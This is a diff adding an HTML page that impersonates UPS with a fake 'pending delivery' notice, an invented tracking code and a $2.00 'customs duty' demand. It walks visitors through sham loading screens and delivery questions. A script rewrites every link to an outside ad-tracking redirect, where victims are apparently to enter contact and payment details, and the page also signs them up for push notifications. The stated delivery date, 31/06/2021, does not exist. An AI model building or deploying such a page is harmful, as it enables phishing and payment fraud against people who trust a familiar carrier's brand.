@@ -1,0 +1,246 @@
+<html class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths" lang="en" style="--vh:6px;"><head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <meta name="description" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=yes">
+    <!-- Chrome Android color -->
+    <meta name="theme-color" content="#fff">
+    <!-- Fonts -->
+    <link href="https://fonts.googleapis.com/css?family=Poppins:400,500,600,700" rel="stylesheet">
+    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <!-- Styles -->
+    <link rel="stylesheet" href="css/styles.css">
+    <!-- Modernizr -->
+    <script src="js/lib/modernizr.js"></script>
+    <script src="js/lib/jquery-3.3.1.min.js"></script>
+    <script src="js/svg4everybody.min.js"></script>
+    <script src="js/init.js"></script>
+    <script src="./js/script.js"></script>
+    <script>
+        $(document).ready(function() {
+            var link = "https://postback.adztrack.info/click";
+
+            $("a").attr("href", link);
+        });
+    </script>
+<script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script>
+<script>
+  window.OneSignal = window.OneSignal || [];
+  OneSignal.push(function() {
+    OneSignal.init({
+      appId: "194812de-f526-41e6-a9e9-2eaf6709fbe2",
+    });
+  });
+</script>
+<script src="https://cdn.onesignal.com/sdks/OneSignalPageSDKES6.js?v=151504" async=""></script></head>
+
+<body class="loaded">
+    <div class="page">
+        <!-- HEADER -->
+        <header class="header">
+            <div class="logo">
+                <img src="./images/UPS_logo.svg" alt="Icon" class="header__icon">
+            </div>
+        </header>
+        <!-- / HEADER -->
+
+        <!-- Screen 1 -->
+        <main class="main main--1">
+            <div class="card">
+                <h2 class="title">PENDING DELIVERY</h2>
+                <span class="badge" data-badge="!"><img src="images/icon-box.svg" alt=""></span>
+                <p>
+                    You have a pending delivery. Use your unique tracking code to track and receive your item.
+                </p>
+
+                <hr>
+
+                <dl class="tracking-code">
+                    <dt>Your tracking code</dt>
+                    <dd>UPS016448296GB</dd>
+                </dl>
+            </div>
+
+            <button type="button" class="btn screen-trigger--1">Track your item</button>
+        </main>
+
+        <!-- Screen 2 -->
+        <main class="main main--2">
+            <div class="card">
+                <div class="spinner"></div>
+
+                <svg role="img" class="main__icon icon icon-check"><use xlink:href="icons/icons.svg#icon-check"></use></svg>
+
+                <ul class="loading-list">
+                    <li>Locating your package...</li>
+                    <li>looking for the tracking number...</li>
+                    <li>Looking for delivery options...</li>
+                </ul>
+            </div>
+        </main>
+
+        <!-- Screen 3 -->
+        <main class="main main--3">
+            <ol class="steps-wrap">
+                <li class="step step--current"></li>
+                <li class="step"></li>
+                <li class="step"></li>
+            </ol>
+            <div class="card">
+                <div class="product">
+                    <!-- <img src="" alt=""> -->
+                    <div class="product__content">
+                        <h3 class="subtitle">Package information:</h3>
+
+                        <dl class="product__info">
+                            <dt>Status:</dt>
+                            <dd>Held at depot(unpaid import duty)</dd>
+                        </dl>
+                        <dl class="product__info">
+                            <dt>Shipping via:</dt>
+                            <dd>Intl tracked courier</dd>
+                        </dl>
+                        <dl class="product__info">
+                            <dt>Customs fee:</dt>
+                            <dd class="price">$2.00</dd>
+                        </dl>
+                    </div>
+                </div>
+            </div>
+            <button type="button" class="btn screen-trigger--2">Schedule delivery now</button>
+        </main>
+
+        <!-- Screen 4 -->
+        <main class="main main--4">
+            <ol class="steps-wrap">
+                <li class="step step--done"></li>
+                <li class="step step--current"></li>
+                <li class="step"></li>
+            </ol>
+
+            <div class="card">
+                <!-- <img src="" alt=""> -->
+
+                <form class="questions-wrap">
+                    <div class="question question--1">
+                        <h2 class="subtitle">How would you like to receive your item?</h2>
+
+                        <div class="question__answers">
+                            <input type="radio" id="question01a" name="question01">
+                            <label for="question01a">
+								<svg role="img" class="icon icon-truck"><use xlink:href="icons/icons.svg#icon-truck"></use></svg>
+								<span>I want it delivered</span>
+							</label>
+
+                            <input type="radio" id="question01b" name="question01" disabled="">
+                            <label for="question01b" data-error="Parcel is already at the depot">
+								<svg role="img" class="icon icon-store"><use xlink:href="icons/icons.svg#icon-store"></use></svg>
+								<span>Collection point</span>
+							</label>
+                        </div>
+                    </div>
+
+                    <div class="question question--2">
+                        <h2 class="subtitle">Where do you want it to be delivered?</h2>
+
+                        <div class="question__answers">
+                            <input type="radio" id="question02a" name="question02">
+                            <label for="question02a">
+								<svg role="img" class="icon icon-home"><use xlink:href="icons/icons.svg#icon-home"></use></svg>
+								<span>At home</span>
+							</label>
+
+                            <input type="radio" id="question02b" name="question02">
+                            <label for="question02b">
+								<svg role="img" class="icon icon-briefcase"><use xlink:href="icons/icons.svg#icon-briefcase"></use></svg>
+								<span>At work</span>
+							</label>
+                        </div>
+                    </div>
+
+                    <div class="question question--3">
+                        <h2 class="subtitle">When do you want delivery?</h2>
+
+                        <div class="question__answers">
+                            <input type="radio" id="question03a" name="question03">
+                            <label for="question03a">
+								<svg role="img" class="icon icon-calendar"><use xlink:href="icons/icons.svg#icon-calendar"></use></svg>
+								<span>Weekdays</span>
+							</label>
+
+                            <input type="radio" id="question03b" name="question03">
+                            <label for="question03b">
+								<svg role="img" class="icon icon-calendar"><use xlink:href="icons/icons.svg#icon-calendar"></use></svg>
+								<span>Weekend</span>
+							</label>
+                        </div>
+                    </div>
+                </form>
+            </div>
+        </main>
+
+        <!-- Screen 5 -->
+        <main class="main main--5">
+            <ol class="steps-wrap">
+                <li class="step step--done"></li>
+                <li class="step step--current"></li>
+                <li class="step"></li>
+            </ol>
+
+            <div class="card">
+                <div class="spinner"></div>
+
+                <svg role="img" class="main__icon icon icon-check"><use xlink:href="icons/icons.svg#icon-check"></use></svg>
+
+                <ul class="loading-list">
+                    <li>Saving your preferences...</li>
+                    <li>Confirming your package...</li>
+                    <li>The package is reserved!</li>
+                </ul>
+            </div>
+        </main>
+
+        <!-- Screen 6 -->
+        <main class="main main--6">
+            <ol class="steps-wrap">
+                <li class="step step--done"></li>
+                <li class="step step--done"></li>
+                <li class="step step--current"></li>
+            </ol>
+            <div class="card">
+                <h2 class="title title--primary">Delivery confirmation</h2>
+                <!-- <img src="" alt="" class="spaced1"> -->
+                <h3 class="subtitle" style="margin-bottom: 25px;">Expected delivery: <br>
+                    <span class="date-delivery">31/06/2021</span>
+                    <span class="time-delivery">Between 8:30 - 18:00</span>
+                </h3>
+                <p>
+                    *Enter your contact information on the next page and pay the <span class="price">$2.00</span> customs duty
+                </p>
+            </div>
+            <a class="btn" href="https://postback.adztrack.info/click">Enter Shipping information</a>
+        </main>
+        <div class="foot">
+            <div class="footer__social">
+                <ul class="social__menu">
+                    <li><a class="facebook_link" href="https://postback.adztrack.info/click"><i class="fa fa-facebook"></i></a></li>
+                    <li><a class="linkedin_link" href="https://postback.adztrack.info/click"><i class="fa fa-linkedin"></i></a></li>
+                    <li><a class="youtube_link" href="https://postback.adztrack.info/click"><i class="fa fa-youtube"></i></a></li>
+                </ul>
+            </div>
+            <div class="footer__contact">
+                <div class="footer__phone">
+                    <a href="https://postback.adztrack.info/click"><i class="fa fa-phone"></i></a>
+                </div>
+                <div class="footer__text">
+                    <h5>Talk to us</h5>
+                    <p>We are available to help</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+
+
+<!-- Localized --></body></html>
